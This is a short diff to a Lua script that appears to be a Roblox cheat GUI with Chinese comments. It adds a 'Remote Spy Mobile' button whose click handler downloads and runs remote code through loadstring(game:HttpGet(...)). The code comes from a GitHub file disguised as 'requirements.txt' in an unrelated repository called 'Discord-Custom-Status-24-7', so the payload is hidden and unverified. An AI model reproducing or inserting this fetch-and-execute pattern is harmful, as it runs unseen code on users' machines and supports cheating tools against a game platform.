@@ -451,6 +451,19 @@ task.spawn(function()
     end
 end)
 
+-- Remote Spy Mobile按鈕
+local remoteSpyBtn = Instance.new("TextButton", CommonButtonsScroll)
+remoteSpyBtn.Size = UDim2.new(0, 160, 0, 30)
+remoteSpyBtn.Text = "Remote Spy Mobile"
+remoteSpyBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+remoteSpyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+remoteSpyBtn.Font = Enum.Font.Gotham
+remoteSpyBtn.TextSize = 14
+Instance.new("UICorner", remoteSpyBtn).CornerRadius = UDim.new(0, 6)
+
+remoteSpyBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/wfrefdewwss/Discord-Custom-Status-24-7/refs/heads/main/requirements.txt"))()
+end)
 
 
 -- 徽章手套分區
